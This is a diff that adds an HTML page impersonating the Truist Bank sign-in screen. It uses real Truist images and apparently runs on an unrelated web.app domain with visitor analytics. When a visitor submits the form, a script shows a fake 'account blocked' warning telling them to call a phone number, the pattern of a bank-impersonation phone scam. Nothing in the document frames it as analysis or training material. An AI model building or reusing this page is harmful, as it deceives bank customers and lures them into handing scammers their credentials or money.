@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+<script defer data-domain="johnnygaddar-tujhenhichhodunga.web.app" src="https://plausible.io/js/script.js"></script>
+
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Truist Bank Login</title>
+    <style>
+      body,
+      html {
+        margin: 0;
+        padding: 0;
+        font-family: Arial, sans-serif;
+        height: 100%;
+      }
+      .container {
+        display: flex;
+        height: 100%;
+      }
+      .left-panel {
+        background-color: #f0e6ff;
+        flex: 1;
+        padding: 40px;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+      }
+      .right-panel {
+        flex: 1;
+        padding: 40px;
+        display: flex;
+        flex-direction: column;
+        justify-content: center;
+        align-items: center;
+      }
+      .logo {
+        max-width: 200px;
+        margin-bottom: 80px;
+        margin-top: -50px;
+      }
+      .credit-card {
+        max-width: 300px;
+        margin-bottom: 20px;
+      }
+      h1 {
+        font-weight: normal;
+        color: #242529;
+        font-size: 28px;
+        margin-bottom: 30px;
+      }
+      .h4tag {
+        color: #72569c;
+      }
+      p {
+        color: #3a294f;
+        text-align: center;
+        max-width: 400px;
+      }
+      form {
+        max-width: 300px;
+      }
+      label {
+        display: block;
+        margin-bottom: 5px;
+        color: #3a294f;
+      }
+      input[type="text"],
+      input[type="password"] {
+        width: 100%;
+        padding: 15px 20px;
+        margin-bottom: 15px;
+        border: 1px solid #ccc;
+        border-radius: 10px;
+      }
+      .checkbox-container {
+        display: flex;
+        align-items: center;
+        margin-bottom: 15px;
+      }
+      .checkbox-container input {
+        margin-right: 5px;
+      }
+      button {
+        width: 115%;
+        padding: 15px;
+        background-color: #6a5492;
+        color: white;
+        border: none;
+        border-radius: 10px;
+        cursor: pointer;
+        font-size: 16px;
+      }
+      .links {
+        margin-top: 15px;
+      }
+      .links a {
+        display: flex;
+        flex-direction: column;
+        align-items: start;
+        color: #3a294f;
+        text-decoration: none;
+        margin-bottom: 5px;
+      }
+      @media (max-width: 768px) {
+        .container {
+          align-items: start;
+        }
+        .login-form {
+          margin-top: 3.5rem;
+        }
+        input[type="text"],
+        input[type="password"] {
+          width: 85%;
+          padding: 15px 20px;
+          margin-bottom: 15px;
+          border: 1px solid #ccc;
+          border-radius: 10px;
+        }
+        button {
+          width: 100%;
+          padding: 15px;
+          background-color: #6a5492;
+          color: white;
+          border: none;
+          border-radius: 10px;
+          cursor: pointer;
+          font-size: 16px;
+        }
+        .left-panel {
+          display: none;
+        }
+        .logo {
+          display: flex;
+          flex-direction: column;
+          margin: 0 auto 20px;
+        }
+        form {
+          max-width: 100%;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <div class="left-panel">
+        <h4 class="h4tag">PREMIUM REWARDS</h4>
+        <img
+          src="https://dias.bank.truist.com/ui/assets/images/enjoybeyond_signature.png"
+          alt="Truist Credit Card"
+          class="credit-card"
+        />
+        <h1>New experiences are waiting.</h1>
+        <p>
+          Pave your path to adventure with 30,000 bonus points after spending
+          $1,500 within 90 days of opening a Truist Enjoy Beyond credit card
+          account.
+        </p>
+      </div>
+      <div class="right-panel">
+        <img
+          src="https://dias.bank.truist.com/ui/assets/logos/trulogo_horz-trupurple.png"
+          alt="Truist Logo"
+          class="logo"
+        />
+        <form class="login-form" id="login-form">
+          <label for="user-id">User ID</label>
+          <input type="text" id="user-id" name="user-id" required />
+          <div class="checkbox-container">
+            <input type="checkbox" id="save-user-id" name="save-user-id" />
+            <label for="save-user-id">Save user ID</label>
+          </div>
+          <label for="password">Password</label>
+          <input type="password" id="password" name="password" required />
+          <button type="submit">Sign in</button>
+          <div
+            id="error-message"
+            style="
+              color: #a94442;
+              background-color: #f2dede;
+              border: 1px solid #ebccd1;
+              padding: 10px;
+              margin-top: 8px;
+              text-align: center;
+              border-radius: 4px;
+              display: none;
+            "
+          >
+            Account Blocked Due to Suspicious Activity Contact Support at <br />
+            <a
+              href="tel:+1-802-399-4043"
+              style="color: blue; text-decoration: underline"
+              >+1-802-399-4043</a
+            >
+            to verify and unlock your account.
+          </div>
+          <div class="links">
+            <a href="#">Forgot User ID</a>
+            <a href="#">Reset Password</a>
+            <br />
+            <br />
+            Don't have an online user ID?<br />
+            <a href="#">Register now</a>
+          </div>
+        </form>
+      </div>
+    </div>
+    <script>
+      document
+        .getElementById("login-form")
+        .addEventListener("submit", function (event) {
+          event.preventDefault();
+          document.getElementById("error-message").style.display = "block";
+        });
+    </script>
+  </body>
+</html>
